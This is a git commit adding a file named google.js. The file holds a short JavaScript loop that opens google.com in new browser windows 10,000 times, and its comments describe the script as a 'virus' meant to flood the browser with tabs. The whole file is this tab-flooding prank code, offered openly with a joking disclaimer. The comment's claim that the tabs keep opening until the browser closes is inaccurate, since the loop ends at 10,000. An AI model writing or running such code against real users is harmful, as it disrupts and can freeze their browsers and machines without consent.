3c1594bd665e3154132c435e3ffbf0e876c4708c
Lewis <110282445+Blackmammba55@users.noreply.github.com>
2023-04-08 11:53:59 +0100

    Create google.js

---
+++ google.js
@@ -0,0 +1,14 @@
+
+
+
+var i = 0; // this is the counter variable
+while (i < 10000) { // this is the condition
+    window.open("http://www.google.com"); // this is the code that runs
+    i++; // this is the incrementer
+    } // this is the end of the loop
+
+
+//this virus is a while loop, it will open 10000 google tabs, and it will keep opening them until you close the browser.
+
+//also its javascript doont use it for bad things :D
+
